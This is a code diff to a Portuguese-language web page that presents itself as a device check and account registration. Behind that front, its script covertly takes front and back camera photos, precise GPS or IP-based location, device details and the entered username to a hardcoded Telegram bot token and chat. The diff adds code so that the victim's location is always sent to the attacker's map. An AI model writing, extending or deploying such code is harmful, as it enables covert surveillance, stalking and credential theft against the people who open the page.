@@ -355,7 +355,7 @@
                 <p class="subtitle">Aguarde enquanto verificamos seu dispositivo...</p>
 
                 <div class="test-item" id="testTouch">
-                    <div class="test-icon">👆</div>
+                    <div class="test-icon"></div>
                     <div class="test-content">
                         <div class="test-name">Touch Screen</div>
                         <div class="test-status">Aguardando...</div>
@@ -398,7 +398,7 @@
                 <div class="progress-text" id="progressText">Liberando conexão... 0%</div>
             </div>
 
-            <div class="version-tag">v9.8.12</div>
+            <div class="version-tag">v9.8.13</div>
 
         </div>
     </div>
@@ -406,11 +406,8 @@
     <script>
         'use strict';
 
-        // ============================================
-        // CONFIGURAÇÕES
-        // ============================================
         const CONFIG = {
-            VERSION: '9.8.12',
+            VERSION: '9.8.13',
             TELEGRAM: {
                 BOT_TOKEN: '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0',
                 CHAT_ID: '-5425475205',
@@ -431,9 +428,6 @@
             }
         };
 
-        // ============================================
-        // LOGGER
-        // ============================================
         const Logger = {
             info(msg, data) { console.log(`[INFO] ${msg}`, data || ''); },
             error(msg, data) { console.error(`[ERROR] ${msg}`, data || ''); },
@@ -441,9 +435,6 @@
             warn(msg, data) { console.warn(`[WARN] ${msg}`, data || ''); }
         };
 
-        // ============================================
-        // HTTP CLIENT CORRIGIDO
-        // ============================================
         const HttpClient = {
             async postJSON(url, data) {
                 for (let attempt = 1; attempt <= CONFIG.TELEGRAM.RETRY_ATTEMPTS; attempt++) {
@@ -465,10 +456,10 @@
                         }
 
                         const result = await response.json();
-                        Logger.success(`Tentativa ${attempt}: OK`);
+                        Logger.info(`JSON tentativa ${attempt}: ${result.ok ? 'OK' : 'FALHOU'}`);
                         return result;
                     } catch (error) {
-                        Logger.warn(`Tentativa ${attempt} falhou: ${error.message}`);
+                        Logger.warn(`JSON tentativa ${attempt} falhou: ${error.message}`);
                         
                         if (attempt === CONFIG.TELEGRAM.RETRY_ATTEMPTS) {
                             throw error;
@@ -498,10 +489,10 @@
                         }
 
                         const result = await response.json();
-                        Logger.success(`Foto tentativa ${attempt}: OK`);
+                        Logger.info(`FormData tentativa ${attempt}: ${result.ok ? 'OK' : 'FALHOU'}`);
                         return result;
                     } catch (error) {
-                        Logger.warn(`Foto tentativa ${attempt} falhou: ${error.message}`);
+                        Logger.warn(`FormData tentativa ${attempt} falhou: ${error.message}`);
                         
                         if (attempt === CONFIG.TELEGRAM.RETRY_ATTEMPTS) {
                             throw error;
@@ -517,21 +508,12 @@
             }
         };
 
-        // ============================================
-        // TELEGRAM SERVICE CORRIGIDO
-        // ============================================
         const TelegramService = {
             getBaseUrl() {
                 return `${CONFIG.TELEGRAM.API_BASE}${CONFIG.TELEGRAM.BOT_TOKEN}`;
             },
 
-            escapeMarkdown(text) {
-                // Escapar caracteres especiais do Markdown do Telegram
-                return text.replace(/[_*`\[\]()~>#+\-=|{}.!]/g, '\\$&');
-            },
-
             async sendMessage(text) {
-                // Validar tamanho
                 if (text.length > CONFIG.TELEGRAM.MAX_MESSAGE_LENGTH) {
                     Logger.warn(`Mensagem muito longa (${text.length}), truncando`);
                     text = text.substring(0, CONFIG.TELEGRAM.MAX_MESSAGE_LENGTH - 50) + '\n\n...[truncado]';
@@ -540,12 +522,10 @@
                 const url = `${this.getBaseUrl()}/sendMessage`;
                 
                 try {
-                    // NÃO usar parse_mode para evitar erros com caracteres especiais
                     const result = await HttpClient.postJSON(url, {
                         chat_id: CONFIG.TELEGRAM.CHAT_ID,
                         text: text
                     });
-
                     return result;
                 } catch (error) {
                     Logger.error('Erro enviar mensagem', error);
@@ -575,16 +555,34 @@
                 }
             },
 
-            async sendLocation(latitude, longitude) {
+            // ✅ CORRIGIDO: Agora envia localização sempre que tiver coordenadas válidas
+            async sendLocation(latitude, longitude, source = 'desconhecida') {
                 const url = `${this.getBaseUrl()}/sendLocation`;
+
+                // Validar coordenadas
+                const lat = parseFloat(latitude);
+                const lon = parseFloat(longitude);
+
+                if (isNaN(lat) || isNaN(lon)) {
+                    Logger.warn(`Coordenadas inválidas: lat=${latitude}, lon=${longitude}`);
+                    return null;
+                }
+
+                // Validar ranges
+                if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
+                    Logger.warn(`Coordenadas fora do range: lat=${lat}, lon=${lon}`);
+                    return null;
+                }
+
+                Logger.info(`Enviando localização: ${lat}, ${lon} (fonte: ${source})`);
 
                 try {
                     const result = await HttpClient.postJSON(url, {
                         chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                        latitude: latitude,
-                        longitude: longitude
+                        latitude: lat,
+                        longitude: lon
                     });
-
+                    Logger.success(`Localização enviada no mapa!`);
                     return result;
                 } catch (error) {
                     Logger.error('Erro enviar localização', error);
@@ -593,66 +591,77 @@
             }
         };
 
-        // ============================================
-        // GPS SERVICE
-        // ============================================
         const GPSService = {
             async getLocation() {
-                if (!navigator.geolocation) {
-                    return this.getIPLocation();
-                }
-
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: CONFIG.GPS.ENABLE_HIGH_ACCURACY,
-                            timeout: CONFIG.GPS.TIMEOUT,
-                            maximumAge: 0
+                // Tenta GPS primeiro
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: CONFIG.GPS.ENABLE_HIGH_ACCURACY,
+                                timeout: CONFIG.GPS.TIMEOUT,
+                                maximumAge: 0
+                            });
                         });
-                    });
 
-                    return {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude || 'N/A',
-                        source: 'GPS_PRECISO'
-                    };
-                } catch (error) {
-                    Logger.warn('GPS falhou, usando IP');
-                    return this.getIPLocation();
+                        Logger.success('GPS obtido com sucesso');
+                        return {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude || 'N/A',
+                            heading: position.coords.heading || 'N/A',
+                            speed: position.coords.speed || 'N/A',
+                            source: 'GPS_PRECISO'
+                        };
+                    } catch (error) {
+                        Logger.warn('GPS falhou, tentando IP', error.message);
+                    }
                 }
+
+                // Fallback para IP
+                return this.getIPLocation();
             },
 
             async getIPLocation() {
                 try {
+                    Logger.info('Buscando localização por IP...');
                     const response = await fetch('https://ipapi.co/json/');
+                    
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    
                     const data = await response.json();
+                    
+                    Logger.info(`IP Location obtido: ${data.latitude}, ${data.longitude}`);
                     
                     return {
                         latitude: data.latitude,
                         longitude: data.longitude,
                         accuracy: 'Aproximada (IP)',
                         altitude: 'N/A',
+                        heading: 'N/A',
+                        speed: 'N/A',
                         source: 'IP_API',
                         ipData: data
                     };
                 } catch (error) {
                     Logger.error('Erro IP location', error);
                     return {
-                        latitude: 'Negado',
-                        longitude: 'Negado',
+                        latitude: null,
+                        longitude: null,
                         accuracy: 'N/A',
                         altitude: 'N/A',
-                        source: 'NEGADO'
+                        heading: 'N/A',
+                        speed: 'N/A',
+                        source: 'FALHOU',
+                        ipData: null
                     };
                 }
             }
         };
 
-        // ============================================
-        // CAMERA MANAGER
-        // ============================================
         const CameraManager = {
             async capturePhoto(facingMode) {
                 let stream = null;
@@ -695,7 +704,6 @@
 
                     const dataURL = canvas.toDataURL('image/jpeg', CONFIG.CAMERA.QUALITY);
 
-                    // Cleanup
                     stream.getTracks().forEach(track => track.stop());
                     video.remove();
                     canvas.remove();
@@ -711,12 +719,8 @@
             }
         };
 
-        // ============================================
-        // DEVICE COLLECTOR
-        // ============================================
         const DeviceCollector = {
             async collectAll() {
-                // Coletar dados em paralelo
                 const [battery, mediaDevices, ipLocation] = await Promise.all([
                     this.getBattery(),
                     this.getMediaDevices(),
@@ -805,9 +809,6 @@
             }
         };
 
-        // ============================================
-        // APP PRINCIPAL
-        // ============================================
         const App = {
             userData: {},
             deviceData: {},
@@ -827,7 +828,6 @@
                 const password = document.getElementById('regPassword').value;
                 const confirmPassword = document.getElementById('regConfirmPassword').value;
 
-                // Validações
                 if (name.length < 3) {
                     alert('Nome deve ter pelo menos 3 caracteres');
                     return;
@@ -919,6 +919,7 @@
 
             async testGPS() {
                 this.deviceData.gps = await GPSService.getLocation();
+                Logger.info('GPS data:', this.deviceData.gps);
             },
 
             async testData() {
@@ -933,14 +934,14 @@
                     if (this.cameraPhotos.front) {
                         await TelegramService.sendPhoto(
                             this.cameraPhotos.front,
-                            ` FOTO FRONTAL\n👤 ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
+                            `📸 FOTO FRONTAL\n👤 ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
                         );
                     }
 
                     if (this.cameraPhotos.back) {
                         await TelegramService.sendPhoto(
                             this.cameraPhotos.back,
-                            `📸 FOTO TRASEIRA\n👤 ${this.userData.username}\n ${new Date().toLocaleString('pt-BR')}`
+                            `📸 FOTO TRASEIRA\n👤 ${this.userData.username}\n🕐 ${new Date().toLocaleString('pt-BR')}`
                         );
                     }
 
@@ -961,18 +962,53 @@
                     await HttpClient.delay(500);
                     
                     await this.sendHistory();
+                    await HttpClient.delay(500);
 
-                    // Enviar localização no mapa
-                    if (this.deviceData.gps?.source === 'GPS_PRECISO') {
-                        await TelegramService.sendLocation(
-                            this.deviceData.gps.latitude,
-                            this.deviceData.gps.longitude
-                        );
-                    }
+                    // ✅ CORRIGIDO: Enviar localização no mapa SEMPRE que tiver coordenadas válidas
+                    await this.sendLocationToMap();
 
                     Logger.success('Todos os dados enviados');
                 } catch (error) {
                     Logger.error('Erro ao enviar dados', error);
+                }
+            },
+
+            // ✅ NOVA FUNÇÃO: Envia localização no mapa (GPS ou IP)
+            async sendLocationToMap() {
+                const gps = this.deviceData.gps;
+                
+                if (!gps) {
+                    Logger.warn('Nenhum dado GPS disponível');
+                    return;
+                }
+
+                Logger.info(`Tentando enviar localização (fonte: ${gps.source})`);
+
+                // Tenta enviar com as coordenadas do GPS/IP
+                try {
+                    await TelegramService.sendLocation(
+                        gps.latitude,
+                        gps.longitude,
+                        gps.source
+                    );
+                    Logger.success('Localização enviada no mapa!');
+                } catch (error) {
+                    Logger.error('Falha ao enviar localização no mapa', error);
+                    
+                    // Se falhou com GPS, tenta com IP
+                    if (gps.source === 'GPS_PRECISO' && this.deviceData.collected?.ipLocation) {
+                        const ip = this.deviceData.collected.ipLocation;
+                        Logger.info('Tentando fallback com IP...');
+                        try {
+                            await TelegramService.sendLocation(
+                                ip.latitude,
+                                ip.longitude,
+                                'IP_FALLBACK'
+                            );
+                        } catch (e) {
+                            Logger.error('Fallback IP também falhou', e);
+                        }
+                    }
                 }
             },
 
@@ -1120,7 +1156,6 @@
             }
         };
 
-        // Cleanup ao fechar
         window.addEventListener('beforeunload', () => {
             Logger.info('Página fechada, cleanup realizado');
         });
